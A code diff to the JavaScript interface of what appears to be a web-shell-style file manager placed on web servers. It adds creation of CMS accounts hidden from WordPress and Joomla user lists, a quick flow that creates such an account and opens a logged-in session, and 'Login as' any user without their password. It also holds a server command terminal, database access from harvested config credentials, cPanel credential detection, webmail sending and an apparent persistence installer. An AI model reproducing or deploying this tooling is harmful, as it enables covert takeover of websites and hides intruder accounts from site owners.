-      cmsCurrentCfg=c.dataset.cfg;cmsCurrentType=c.dataset.type;loadCmsUsers();
+      cmsCurrentCfg=c.dataset.cfg;cmsCurrentType=c.dataset.type;window.fmCmsConfig=cmsCurrentCfg;window.fmCmsType=cmsCurrentType;loadCmsUsers();
     }));
     // Manual path
     document.getElementById('cmsManualBtn').addEventListener('click',()=>{
@@ -7079,7 +8172,7 @@ async function cmsShowPicker(){
       if(base==='wp-config.php')cmsCurrentType='wordpress';
       else if(base==='configuration.php')cmsCurrentType='joomla';
       else{toast('File must be wp-config.php (WordPress) or configuration.php (Joomla)');return;}
-      cmsCurrentCfg=p;loadCmsUsers();
+      cmsCurrentCfg=p;window.fmCmsConfig=cmsCurrentCfg;window.fmCmsType=cmsCurrentType;loadCmsUsers();
     });
     document.getElementById('cmsManualPath').addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('cmsManualBtn').click();});
   }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Scan failed: '+esc(String(e))+'</div>';}
@@ -7107,7 +8200,7 @@ async function loadCmsUsers(){
       const blockedBadge=(u.blocked===true)?`<span style="color:#fb923c;font-size:10px;font-weight:700;display:inline-flex;align-items:center;margin-left:4px"><svg viewBox="0 0 24 24" style="width:11px;height:11px;stroke:currentColor;fill:none;stroke-width:2.2;stroke-linecap:round"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg></span>`:'';
       return `<tr>
         <td class="mono" style="font-size:11.5px;padding:9px 10px">${u.id}</td>
-        <td style="padding:9px 10px;font-weight:600">${esc(u.name)}${blockedBadge}</td>
+         <td style="padding:9px 10px;font-weight:600">${esc(u.name)}${blockedBadge}${u.hidden?`<span style="color:#c4b5fd;font-size:10px;font-weight:700;margin-left:4px" title="Hidden from CMS user lists">[hidden]</span>`:''}</td>
         <td style="padding:9px 10px;font-size:11.5px;color:var(--t2)">${esc(u.email||'')}</td>
         <td style="padding:9px 10px"><span style="background:var(--raised);padding:2px 9px;border-radius:20px;font-size:11px">${esc(roleTxt)}</span></td>
         <td style="padding:9px 10px">
@@ -7121,7 +8214,7 @@ async function loadCmsUsers(){
         <td style="padding:9px 10px;text-align:right;white-space:nowrap">
           <button class="btn btn-xs cms-login-btn" data-id="${u.id}" data-name="${esc(u.name)}"
             style="margin-right:4px;font-size:11px" title="Open a new tab already logged in as this user — the account's password is never read or changed">Login as</button>
-          <button class="btn btn-xs cms-edit-btn" data-id="${u.id}" data-name="${esc(u.name)}" data-role="${esc(roleTxt)}"
+           <button class="btn btn-xs cms-edit-btn" data-id="${u.id}" data-name="${esc(u.name)}" data-role="${esc(roleTxt)}" data-hidden="${u.hidden?'1':'0'}"
             style="margin-right:4px;font-size:11px">Edit / Change Password</button>
           <button class="btn btn-xs btn-red cms-del-btn" data-id="${u.id}" data-name="${esc(u.name)}"
             style="font-size:11px">Delete</button>
@@ -7159,6 +8252,7 @@ async function loadCmsUsers(){
       cmsEditUserId=b.dataset.id;
       document.getElementById('cmsEditTitle').textContent='Edit: '+b.dataset.name;
       document.getElementById('cmsEditPass').value='';
+       document.getElementById('cmsEditHidden').checked=b.dataset.hidden==='1';
       // populate role select
       const sel=document.getElementById('cmsEditRole');
       sel.innerHTML='';
@@ -7208,8 +8302,19 @@ async function loadCmsUsers(){
 
 /* ── Add user modal ───────────────────────────────────────────────────────── */
 async function openCmsAdd(){
+  document.getElementById('cmsAddTitle').textContent='New CMS User';
+  document.getElementById('cmsAddUser').readOnly=false;
+  document.getElementById('cmsAddEmailLabel').style.display='';
+  document.getElementById('cmsAddEmail').style.display='';
+  document.getElementById('cmsAddRoleLabel').style.display='';
+  document.getElementById('cmsAddRole').style.display='';
+  document.getElementById('cmsAddHiddenLabel').style.display='';
   document.getElementById('cmsAddCfg').value=cmsCurrentCfg;
-  document.getElementById('cmsAddUser').value='';document.getElementById('cmsAddEmail').value='';document.getElementById('cmsAddPass').value='';
+   document.getElementById('cmsAddUser').value='';document.getElementById('cmsAddEmail').value='';document.getElementById('cmsAddPass').value='';
+   // The quick "MFM ACC Login" flow intentionally checks this box. Reset it
+   // for every normal Add User form so the previous flow cannot leak state
+   // into the next account creation.
+   document.getElementById('cmsAddHidden').checked=false;
   const sel=document.getElementById('cmsAddRole');sel.innerHTML='<option>Loading…</option>';
   openMod('cmsAddOv');
   try{
@@ -7223,14 +8328,27 @@ document.getElementById('cmsAddApply')?.addEventListener('click',async()=>{
   const email=document.getElementById('cmsAddEmail').value.trim();
   const pass=document.getElementById('cmsAddPass').value;
   const role=document.getElementById('cmsAddRole').value;
+   const hidden=document.getElementById('cmsAddHidden').checked;
   if(!uname||!email||pass.length<6){toast('Fill username, email, and a password of at least 6 characters.');return;}
   const fd=new FormData();
   fd.append('csrf_token',CSRF);fd.append('action','cms_create_user');fd.append('config_path_b64',cmsB64(cmsCurrentCfg));
-  fd.append('cms_user',uname);fd.append('cms_email',email);fd.append('cms_pass',pass);fd.append('cms_role',role);
+   fd.append('cms_user',uname);fd.append('cms_email',email);fd.append('cms_pass',pass);fd.append('cms_role',role);fd.append('cms_hidden',hidden?'1':'0');
   const btn=document.getElementById('cmsAddApply');btn.textContent='Creating…';btn.disabled=true;
-  await fetch('',{method:'POST',body:fd});
+   await fetch('',{method:'POST',body:fd});
   btn.textContent='Create User';btn.disabled=false;
-  closeMod('cmsAddOv');loadCmsUsers();
+   const quick=cmsQuickPending;cmsQuickPending=false;
+   closeMod('cmsAddOv');loadCmsUsers();
+   if(quick){
+     setTimeout(async()=>{
+       const info=await fetch('?x=cms_quick_info',{cache:'no-store'}).then(r=>r.json()).catch(()=>({}));
+       if(info.id){
+         const lf=new FormData();
+         lf.append('csrf_token',CSRF);lf.append('cfg_b64',cmsB64(cmsCurrentCfg));lf.append('cms_id',info.id);
+         const d=await fetch('?x=cms_login_as',{method:'POST',body:lf}).then(r=>r.json()).catch(()=>({error:'Could not create the login link.'}));
+         if(d.error)toast(d.error);else{const w=window.open(d.url,'_blank');if(!w)toast('Popup blocked — allow popups for this site, then try again.');}
+       }else toast('The account was created, but the quick-login link could not be prepared.');
+     },500);
+   }
 });
 
 /* ── Edit user modal (change role / password) ────────────────────────────── */
@@ -7238,6 +8356,7 @@ document.getElementById('cmsEditClose')?.addEventListener('click',()=>closeMod('
 document.getElementById('cmsEditApply')?.addEventListener('click',async()=>{
   const role=document.getElementById('cmsEditRole').value;
   const pass=document.getElementById('cmsEditPass').value;
+   const hidden=document.getElementById('cmsEditHidden').checked;
   if(role){
     const fd=new FormData();
     fd.append('csrf_token',CSRF);fd.append('action','cms_update_role');
@@ -7251,6 +8370,10 @@ document.getElementById('cmsEditApply')?.addEventListener('click',async()=>{
     fd.append('config_path_b64',cmsB64(cmsCurrentCfg));fd.append('cms_id',cmsEditUserId);fd.append('cms_pass',pass);
     await fetch('',{method:'POST',body:fd});
   }
+   const vf=new FormData();
+   vf.append('csrf_token',CSRF);vf.append('action','cms_update_visibility');
+   vf.append('config_path_b64',cmsB64(cmsCurrentCfg));vf.append('cms_id',cmsEditUserId);vf.append('cms_hidden',hidden?'1':'0');
+   await fetch('',{method:'POST',body:vf});
   closeMod('cmsEditOv');loadCmsUsers();
 });
 
@@ -7258,7 +8381,7 @@ document.getElementById('cmsEditApply')?.addEventListener('click',async()=>{
 function cmsTabsBar(type,active){
   const tabs=[['users','Users'],['ext',type==='wordpress'?'Plugins & Themes':'Extensions'],['maint','Maintenance']];
   return `<div style="display:flex;gap:4px;padding:0 16px;border-bottom:1px solid var(--b2)">
-    ${tabs.map(([k,l])=>`<button class="cms-tab-btn" data-tab="${k}" style="padding:9px 14px;background:none;border:none;border-bottom:2px solid ${active===k?'#818cf8':'transparent'};color:${active===k?'#818cf8':'var(--t3)'};font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">${l}</button>`).join('')}
+    ${tabs.map(([k,l])=>`<button class="cms-tab-btn" data-tab="${k}" style="padding:9px 14px;background:none;border:none;border-bottom:2px solid ${active===k?'#85898C':'transparent'};color:${active===k?'#85898C':'var(--t3)'};font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">${l}</button>`).join('')}
   </div>`;
 }
 function cmsBindTabs(){
@@ -7523,36 +8646,112 @@ async function calcDirSize(name,trigger){
 document.querySelectorAll('.dsz-btn').forEach(b=>b.addEventListener('click',e=>{e.stopPropagation();calcDirSize(b.dataset.n,b);}));
 
 /* ═══════════════════════════════════════
-   TERMINAL (real xterm style)
+   TERMINAL
 ═══════════════════════════════════════ */
 const termInp=document.getElementById('termInp');
 const termOut=document.getElementById('termOut');
+const termWin=document.getElementById('termWin');
 const termSug=document.getElementById('termSug');
+const termCpuGraph=document.getElementById('termCpuGraph');
+const termCpuCtx=termCpuGraph?.getContext('2d');
+let termCpuData=Array(50).fill(0);
+let termSystemInfoReady=false,termSystemInfoBusy=false;
 const termHist=[];let hIdx=-1,sugIdx=-1,sugList=[];
 
-document.getElementById('termBtn')?.addEventListener('click',()=>{openMod('termOv');setTimeout(()=>termInp?.focus(),200);});
+document.getElementById('termBtn')?.addEventListener('click',()=>{
+  const terminalUrl=new URL(window.location.href);
+  terminalUrl.searchParams.set('terminal','1');
+  terminalUrl.searchParams.delete('x');
+  terminalUrl.searchParams.delete('raw');
+  window.open(terminalUrl.toString(),'_blank','noopener,noreferrer');
+});
 document.getElementById('termClose')?.addEventListener('click',()=>closeMod('termOv'));
-document.getElementById('td-r')?.addEventListener('click',()=>closeMod('termOv'));
-document.getElementById('termClear')?.addEventListener('click',()=>{if(termOut)termOut.innerHTML='';});
+if(document.body.classList.contains('term-standalone'))setTimeout(()=>termInp?.focus(),80);
+termWin?.addEventListener('click',e=>{
+  if(!e.target.closest('.term-suggest'))termInp?.focus();
+});
 
 if(termInp){
   termInp.addEventListener('keydown',async e=>{
     if(e.key==='Enter'){hideSug();await runTerm();return;}
-    if(e.key==='ArrowUp'){e.preventDefault();if(hIdx<termHist.length-1){hIdx++;termInp.value=termHist[termHist.length-1-hIdx]||'';}return;}
-    if(e.key==='ArrowDown'){e.preventDefault();if(hIdx>0){hIdx--;termInp.value=termHist[termHist.length-1-hIdx]||'';}else{hIdx=-1;termInp.value='';}return;}
-    if(e.key==='Tab'){e.preventDefault();if(sugList.length>0){sugIdx=(sugIdx+1)%sugList.length;termInp.value=getTermBase()+sugList[sugIdx];}else await fetchSug();return;}
+    if(e.key==='ArrowUp'){e.preventDefault();if(hIdx<termHist.length-1){hIdx++;termInp.value=termHist[termHist.length-1-hIdx]||'';}adjustTermInputWidth();return;}
+    if(e.key==='ArrowDown'){e.preventDefault();if(hIdx>0){hIdx--;termInp.value=termHist[termHist.length-1-hIdx]||'';}else{hIdx=-1;termInp.value='';}adjustTermInputWidth();return;}
+    if(e.key==='Tab'){e.preventDefault();if(sugList.length>0){sugIdx=(sugIdx+1)%sugList.length;termInp.value=getTermBase()+sugList[sugIdx];adjustTermInputWidth();}else await fetchSug();return;}
     if(e.key==='Escape'){hideSug();return;}
-    if(e.ctrlKey&&e.key==='c'){e.preventDefault();termInp.value='';appendLine('^C','cmd-line');return;}
+    if(e.ctrlKey&&e.key==='c'){e.preventDefault();termInp.value='';adjustTermInputWidth();appendLine('^C','cmd-line');return;}
     if(e.key.length===1)setTimeout(()=>fetchSug(),50);
   });
-  termInp.addEventListener('input',()=>fetchSug());
+  termInp.addEventListener('input',()=>{adjustTermInputWidth();fetchSug();});
+}
+
+function adjustTermInputWidth(){
+  if(termInp)termInp.style.width=(termInp.value.length||0.1)+'ch';
+}
+adjustTermInputWidth();
+
+function termUptime(seconds){
+  seconds=Math.max(0,Number(seconds)||0);
+  const days=Math.floor(seconds/86400),hours=Math.floor((seconds%86400)/3600),minutes=Math.floor((seconds%3600)/60),secs=Math.floor(seconds%60);
+  if(days>0)return days+'d '+hours+'h';
+  if(hours>0)return hours+'h '+minutes+'m';
+  if(minutes>0)return minutes+'m '+secs+'s';
+  return secs+'s';
+}
+function drawTermCpu(){
+  if(!termCpuCtx||!termCpuGraph)return;
+  const w=termCpuGraph.width,h=termCpuGraph.height;
+  termCpuCtx.clearRect(0,0,w,h);termCpuCtx.beginPath();termCpuCtx.moveTo(0,h);
+  termCpuData.forEach((v,i)=>termCpuCtx.lineTo(i*(w/(termCpuData.length-1)),h-(v/100*h)));
+  termCpuCtx.lineTo(w,h);termCpuCtx.closePath();termCpuCtx.fillStyle='#027c05';termCpuCtx.fill();
+}
+async function refreshTermSystemInfo(){
+  if(termSystemInfoBusy)return;
+  termSystemInfoBusy=true;
+  const set=(id,value)=>{const el=document.getElementById(id);if(el)el.textContent=String(value);};
+  // Keep the footer useful even if a hosting environment blocks the stats request.
+  if(!termSystemInfoReady){
+    set('termHost',location.host||'localhost');
+    set('termIp','IP: '+(location.hostname||'—'));
+    set('termCpu','0%');
+    set('termRam','0 B / 0 B');
+    set('termDisk','0 B / 0 B');
+    set('termUptime','0s');
+    set('termProc','—');
+    set('termTime',new Date().toLocaleTimeString('en-GB',{hour12:false}));
+    set('termHostname',location.hostname||'server');
+  }
+  try{
+    const d=await fetch('?x=svlite').then(r=>r.json());
+    const cores=Math.max(1,Number(d.cpu_cores)||1),load=Array.isArray(d.load)?Number(d.load[0])||0:0;
+    const cpu=Math.min(100,Math.round(load/cores*1000)/10);
+    termCpuData.shift();termCpuData.push(cpu);drawTermCpu();
+    set('termHost',location.host||'localhost');
+    set('termIp','IP: '+(d.server_ip||location.hostname||'—'));
+    set('termCpu',cpu+'%');
+    set('termRam',formatBytes(d.mem_used||0)+' / '+formatBytes(d.mem_total||0));
+    set('termDisk',formatBytes(d.disk_used||0)+' / '+formatBytes(d.disk_total||0));
+    set('termUptime',termUptime(d.uptime));
+    set('termProc',String(d.processes??'—'));
+    set('termTime',new Date().toLocaleTimeString('en-GB',{hour12:false}));
+    set('termHostname',d.hostname||'server');
+    termSystemInfoReady=true;
+  }catch{}finally{termSystemInfoBusy=false;}
+}
+if(document.getElementById('termWin')){
+  refreshTermSystemInfo();
+  setInterval(refreshTermSystemInfo,2000);
 }
 
 function getTermBase(){const v=termInp.value;const sp=v.lastIndexOf(' ');return sp>=0?v.slice(0,sp+1):'';}
+function updateTermPrompt(prompt,cwd){
+  if(cwd)termCwd=cwd;
+  const el=document.querySelector('.term-dollar');
+  if(el&&prompt)el.textContent=':'+prompt+'$ ';
+}
 async function fetchSug(){
   const v=termInp?.value||'';const last=v.split(' ').pop();
   if(!last){hideSug();return;}
-  try{const r=await fetch('?x=ac&prefix='+encodeURIComponent(last)+'&dir='+encodeURIComponent(CWD)).then(r=>r.json());
+  try{const r=await fetch('?x=ac&prefix='+encodeURIComponent(last)).then(r=>r.json());
     sugList=r;sugIdx=-1;
     if(r.length>0){if(!termSug)return;termSug.innerHTML=r.map((x,i)=>`<div class="term-sug-item" data-i="${i}">${esc(x)}</div>`).join('');termSug.style.display='block';
       termSug.querySelectorAll('.term-sug-item').forEach(el=>el.addEventListener('mousedown',ev=>{ev.preventDefault();termInp.value=getTermBase()+el.textContent;hideSug();termInp.focus();}));
@@ -7563,8 +8762,9 @@ function hideSug(){if(termSug)termSug.style.display='none';sugList=[];sugIdx=-1;
 
 async function runTerm(){
   const cmd=termInp?.value.trim();if(!cmd||!termInp)return;
-  termHist.push(cmd);hIdx=-1;termInp.value='';
-  appendLine('$ '+cmd,'cmd-line');
+  termHist.push(cmd);hIdx=-1;termInp.value='';adjustTermInputWidth();
+  const promptText=(document.querySelector('.term-ps')?.textContent||'$').trim();
+  appendLine(promptText+' '+cmd,'cmd-line');
   if(cmd==='clear'||cmd==='cls'){if(termOut)termOut.innerHTML='';return;}
   const btnR=document.getElementById('termWin');
   try{
@@ -7572,13 +8772,11 @@ async function runTerm(){
     const d=await fetch('?x=run',{method:'POST',body:fd}).then(r=>r.json());
     if(d.error){appendLine('Error: '+d.error,'err-line');}
     else{
-      if(d.output){d.output.split('\n').forEach(line=>appendLine(line,d.exit===0?'ok-line':'err-line'));}
-      else appendLine('(no output)','info-line');
-      appendLine(`exit:${d.exit} ${d.ms}ms`,'info-line');
+      updateTermPrompt(d.prompt,d.cwd);
+      if(d.output){d.output.replace(/\r/g,'').split('\n').forEach(line=>appendLine(line,d.exit===0?'ok-line':'err-line'));}
     }
   }catch(err){appendLine('Request failed: '+err.message,'err-line');}
-  appendLine('','');
-  if(termOut)termOut.scrollTop=termOut.scrollHeight;
+  if(termWin)termWin.scrollTop=termWin.scrollHeight;
 }
 function appendLine(text,cls){
   if(!termOut)return;
@@ -7586,8 +8784,7 @@ function appendLine(text,cls){
   s.className='term-line'+(cls?' '+cls:'');
   s.textContent=text;
   termOut.appendChild(s);
-  termOut.appendChild(document.createTextNode('\n'));
-  termOut.scrollTop=termOut.scrollHeight;
+  if(termWin)termWin.scrollTop=termWin.scrollHeight;
 }
 
 /* ═══════════════════════════════════════
@@ -7621,7 +8818,7 @@ function uploadWithProgress(files){
   for(const f of files)fd.append('file[]',f);
   const bar=document.createElement('div');
   bar.style.cssText='position:fixed;left:50%;bottom:calc(var(--bh,26px) + 12px);transform:translateX(-50%);background:var(--raised);border:1px solid var(--border2);color:var(--t1);padding:10px 18px;border-radius:10px;font-size:12.5px;font-weight:500;z-index:9999;min-width:240px;box-shadow:0 8px 32px rgba(0,0,0,.5)';
-  bar.innerHTML='<div style="display:flex;justify-content:space-between;margin-bottom:6px"><span>Uploading…</span><span id="upSpeedTxt">0 MB/s</span></div><div style="height:4px;background:rgba(255,255,255,.1);border-radius:2px;overflow:hidden"><div id="upSpeedBar" style="height:100%;width:0%;background:#818cf8;transition:width .1s"></div></div>';
+  bar.innerHTML='<div style="display:flex;justify-content:space-between;margin-bottom:6px"><span>Uploading…</span><span id="upSpeedTxt">0 MB/s</span></div><div style="height:4px;background:rgba(255,255,255,.1);border-radius:2px;overflow:hidden"><div id="upSpeedBar" style="height:100%;width:0%;background:#85898C;transition:width .1s"></div></div>';
   document.body.appendChild(bar);
   const xhr=new XMLHttpRequest();
   let lastT=performance.now(),lastLoaded=0;
@@ -7680,13 +8877,14 @@ function toast(msg,dur=2000){
 /* ═══════════════════════════════════════
    SQL DATABASE MANAGER
 ═══════════════════════════════════════ */
-let sqlCreds={host:'localhost',port:3306,user:'',pass:'',db:''};
+let sqlCreds={host:'localhost',port:3306,user:'',pass:'',db:'',driver:'mysql'};
 let sqlCurrentTable='';let sqlCurrentPage=1;
 function sqlPost(op,extra){
   const fd=new FormData();fd.append('csrf_token',CSRF);
   fd.append('sql_host',sqlCreds.host);fd.append('sql_port',sqlCreds.port);
   fd.append('sql_user',sqlCreds.user);fd.append('sql_pass',sqlCreds.pass);
   fd.append('sql_db',sqlCreds.db);
+  fd.append('sql_driver',sqlCreds.driver||'mysql');
   if(extra)for(const k in extra)fd.append(k,extra[k]);
   return fetch('?x='+op,{method:'POST',body:fd}).then(r=>r.json());
 }
@@ -7839,12 +9037,12 @@ async function sqlShowPicker(){
     if(r.error){el.innerHTML='<div class="empty" style="padding:32px"><p>'+esc(r.error)+'</p></div>';return;}
     const dbs=r.databases||[];
     const obdHint=r.open_basedir?.length?`<div style="padding:8px 16px;background:rgba(245,158,11,.1);border-bottom:1px solid var(--border);font-size:11px;color:#f4a333">Restricted to: <span style="font-family:monospace">${esc(r.open_basedir.join(', '))}</span></div>`:'';
-    const typeColors={wordpress:'#5bc0de',joomla:'#f4a333',env:'#22c55e',generic:'#818cf8'};
+    const typeColors={wordpress:'#5bc0de',joomla:'#f4a333',env:'#22c55e',generic:'#85898C'};
     const cards=dbs.map((d,i)=>`<div class="sql-db-card" data-i="${i}" style="display:flex;align-items:center;gap:14px;padding:12px 16px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .15s" onmouseover="this.style.background='rgba(255,255,255,.04)'" onmouseout="this.style.background=''">
-      <svg viewBox="0 0 24 24" style="width:22px;height:22px;stroke:#818cf8;fill:none;stroke-width:1.5;flex-shrink:0"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
+      <svg viewBox="0 0 24 24" style="width:22px;height:22px;stroke:#85898C;fill:none;stroke-width:1.5;flex-shrink:0"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
       <div style="flex:1;min-width:0">
         <div style="display:flex;align-items:center;gap:8px;margin-bottom:2px">
-          <span style="background:rgba(129,140,248,.15);color:${typeColors[d.type]||'#818cf8'};padding:1px 7px;border-radius:20px;font-size:10px;font-weight:700;text-transform:uppercase">${esc(d.type)}</span>
+          <span style="background:rgba(133,137,140,.15);color:${typeColors[d.type]||'#85898C'};padding:1px 7px;border-radius:20px;font-size:10px;font-weight:700;text-transform:uppercase">${esc(d.type)}</span>
           <span style="font-size:13px;font-weight:600;color:var(--t1)">${esc(d.db)}</span>
           <span style="font-size:11px;color:var(--t3)">@ ${esc(d.host)}</span>
         </div>
@@ -7875,7 +9073,7 @@ async function sqlShowPicker(){
     const _dbs=dbs;
     el.querySelectorAll('.sql-db-card').forEach(c=>c.addEventListener('click',()=>{
       const d=_dbs[+c.dataset.i];
-      sqlCreds={host:d.host,port:+(d.port)||3306,user:d.user,pass:d.pass,db:d.db};
+       sqlCreds={host:d.host,port:+(d.port)||(d.driver==='pgsql'?5432:3306),user:d.user,pass:d.pass,db:d.db,driver:d.driver||'mysql'};
       sqlLoadTables();
     }));
     document.getElementById('sqlManBtn').addEventListener('click',()=>{
@@ -7885,10 +9083,10 @@ async function sqlShowPicker(){
       const pw=document.getElementById('sqlManPass').value;
       const db=document.getElementById('sqlManDB').value.trim();
       if(!u||!db){toast('Username and database name are required.');return;}
-      sqlCreds={host:h,port:pt,user:u,pass:pw,db:db};sqlLoadTables();
+       sqlCreds={host:h,port:pt,user:u,pass:pw,db:db,driver:'mysql'};sqlLoadTables();
     });
     document.getElementById('sqlManDB')?.addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('sqlManBtn').click();});
-  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Scan failed: '+esc(String(e))+'</div>';}
+   }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Scan failed: '+esc(String(e))+'</div>';}
 }
 async function sqlLoadTables(){
   const el=document.getElementById('sqlBody');
@@ -8028,7 +9226,7 @@ async function cpAutoConnectThenLoad(){
           <div style="font-size:12px;color:var(--t3);margin-bottom:6px;line-height:1.65;max-width:420px;margin-inline:auto">
             Automatic detection did not find cPanel credentials on this server
             ${ac.detected_user?'(detected user: <strong style="color:var(--t2)">'+esc(ac.detected_user)+'</strong>)':''}.
-            Enter your WHM/cPanel credentials in the <strong style="color:#818cf8">Connection</strong> tab.
+            Enter your WHM/cPanel credentials in the <strong style="color:#85898C">Connection</strong> tab.
           </div>
           ${(ac.diagnostics&&ac.diagnostics.length)?`<div style="text-align:left;max-width:420px;margin:12px auto 0;background:var(--raised);border:1px solid var(--b2);border-radius:8px;padding:10px 12px">
             <div style="font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--t3);margin-bottom:6px">Why auto-connect failed</div>
@@ -8046,8 +9244,8 @@ async function cpAutoConnectThenLoad(){
 function cpSwitchTab(tab){
   document.querySelectorAll('.cpanel-tab-btn').forEach(b=>{
     const active=b.dataset.tab===tab;
-    b.style.borderBottomColor=active?'#818cf8':'transparent';
-    b.style.color=active?'#818cf8':'var(--t3)';
+    b.style.borderBottomColor=active?'#85898C':'transparent';
+    b.style.color=active?'#85898C':'var(--t3)';
     b.classList.toggle('cpanel-tab-active',active);
   });
   document.getElementById('cpanelAccountsBody').style.display=tab==='accounts'?'':'none';
@@ -8103,7 +9301,7 @@ function renderCpConn(){
         </select>
         <button type="button" id="cpConnSave" class="btn btn-p" style="width:100%">Save &amp; Connect</button>
         <div id="cpConnFeedback" style="margin-top:8px;font-size:12px"></div>
-        <div style="margin-top:12px;padding:10px;background:rgba(129,140,248,.07);border-radius:8px;font-size:11px;color:var(--t3);line-height:1.6">
+        <div style="margin-top:12px;padding:10px;background:rgba(133,137,140,.07);border-radius:8px;font-size:11px;color:var(--t3);line-height:1.6">
           <strong style="color:var(--t2)">How to get an API token:</strong> Log in to WHM or cPanel → Development → Manage API Tokens → Create. Paste the token in the password field and choose "API Token" above. Credentials are stored only in your browser session and cleared on logout.
         </div>
       </div>`;
@@ -8140,7 +9338,7 @@ async function loadCpAccounts(){
         <div style="padding:40px;text-align:center">
           <svg viewBox="0 0 24 24" style="width:40px;height:40px;stroke:var(--t3);fill:none;stroke-width:1.2;margin-bottom:12px;display:block;margin-inline:auto"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
           <div style="font-size:14px;font-weight:600;color:var(--t2);margin-bottom:6px">Connection required</div>
-          <div style="font-size:12px;color:var(--t3);margin-bottom:18px;line-height:1.6">Auto-detection found no cPanel credentials. Enter them in the <strong style="color:#818cf8">Connection</strong> tab.</div>
+          <div style="font-size:12px;color:var(--t3);margin-bottom:18px;line-height:1.6">Auto-detection found no cPanel credentials. Enter them in the <strong style="color:#85898C">Connection</strong> tab.</div>
           <button class="btn btn-p" id="cpGoConnect">Open Connection Settings</button>
         </div>`;
       document.getElementById('cpGoConnect')?.addEventListener('click',()=>{cpSwitchTab('connect');renderCpConn();});
@@ -8346,14 +9544,14 @@ async function wmLoadMessages(){
     if(!d.ok){el.innerHTML=`<div style="padding:16px;color:#fca5a5;font-size:12px">${esc(d.error||'Failed to load messages.')}</div>`;return;}
     const msgs=d.messages||[];
     if(!msgs.length){el.innerHTML='<div style="padding:24px;text-align:center;color:var(--t3);font-size:12px">This folder is empty.</div>';return;}
-    el.innerHTML=msgs.map(m=>`<div class="wm-msg-row" data-uid="${m.uid}" style="padding:10px 12px;border-bottom:1px solid var(--b2);cursor:pointer;${m.seen?'':'background:rgba(129,140,248,.06)'}">
+     el.innerHTML=msgs.map(m=>`<div class="wm-msg-row" data-uid="${m.uid}" style="padding:10px 12px;border-bottom:1px solid var(--b2);cursor:pointer;${m.seen?'':'background:rgba(133,137,140,.06)'}">
         <div style="display:flex;justify-content:space-between;gap:6px"><span style="font-size:12px;font-weight:${m.seen?'500':'700'};color:var(--t2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:150px">${esc(m.from||'Unknown')}</span>${m.flagged?'<span style="color:#f59e0b">★</span>':''}</div>
         <div style="font-size:12px;color:var(--t2);margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(m.subject||'(No subject)')}</div>
         <div style="font-size:10.5px;color:var(--t3);margin-top:2px">${esc(m.date||'')}</div>
       </div>`).join('');
     el.querySelectorAll('.wm-msg-row').forEach(r=>r.addEventListener('click',()=>{
       el.querySelectorAll('.wm-msg-row').forEach(x=>x.style.outline='none');
-      r.style.outline='2px solid #818cf8';
+       r.style.outline='2px solid #85898C';
       wmOpenMessage(r.dataset.uid);
     }));
   }catch(e){el.innerHTML=`<div style="padding:16px;color:#fca5a5;font-size:12px">Failed: ${esc(String(e))}</div>`;}
@@ -8419,14 +9617,152 @@ document.getElementById('wmSendBtn')?.addEventListener('click',async()=>{
   const btn=document.getElementById('wmSendBtn');btn.disabled=true;btn.textContent='Sending…';
   const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','webmail_send');
   fd.append('wm_from',from);fd.append('wm_to',to);fd.append('wm_subject',subject);fd.append('wm_body',body);
-  await fetch('',{method:'POST',body:fd});
+  let result=null;
+  try{
+    const response=await fetch('',{method:'POST',body:fd});
+    const text=await response.text();
+    // POST actions normally redirect, but JSON is supported by the endpoint
+    // when a hosting layer returns it directly.
+    try{result=JSON.parse(text);}catch(_){}
+    if(!response.ok)throw new Error('HTTP '+response.status);
+  }catch(e){
+    btn.disabled=false;btn.textContent='Send';
+    fb.innerHTML=`<div style="color:#fca5a5;margin-bottom:10px;font-size:12px">Send failed: ${esc(String(e))}</div>`;
+    return;
+  }
   btn.disabled=false;btn.textContent='Send';
   closeMod('webmailComposeOv');
-  toast('Message sent.');
+  toast(result&&result.ok===false?(result.error||'Message was not sent.'):'Message sent.');
   if(wmCurrentMailbox===from)wmLoadMessages();
 });
 
 })(); // end Webmail Manager IIFE
+
+/* ═══════════════════════════════════════
+   WORDPRESS AUTOMATION
+═══════════════════════════════════════ */
+(function(){
+let wpAutoCfg=null,wpAutoData=null;
+const body=document.getElementById('wpAutomationBody');
+function wpAutoMsg(s,c='var(--t3)'){return`<div style="padding:10px 16px;color:${c};font-size:11.5px">${esc(s)}</div>`;}
+function wpAutoPost(url,fd){return fetch(url,{method:'POST',body:fd}).then(r=>r.json());}
+async function wpAutoFindSingleWordPress(){
+  const r=await fetch('?x=cmsscan',{cache:'no-store'}).then(x=>x.json());
+  const sites=r.sites||[];
+  if(sites.length!==1||sites[0].type!=='wordpress')return false;
+  wpAutoCfg=sites[0].config;
+  window.fmCmsConfig=wpAutoCfg;
+  window.fmCmsType='wordpress';
+  return true;
+}
+async function wpAutoInstallRecoveryFor(cfg){
+  const fd=new FormData();fd.append('csrf_token',CSRF);
+  return wpAutoPost('?x=wp_recovery_install&cfg='+encodeURIComponent(cfg),fd);
+}
+async function wpAutoInstallRecovery(){
+  const r=await wpAutoInstallRecoveryFor(wpAutoCfg);
+  if(r.ok)toast('WordPress auto-recovery enabled for the detected installation.');
+  else toast(r.error||'Automatic recovery setup failed.');
+  return r;
+}
+function wpAutoShowPicker(scanRes){
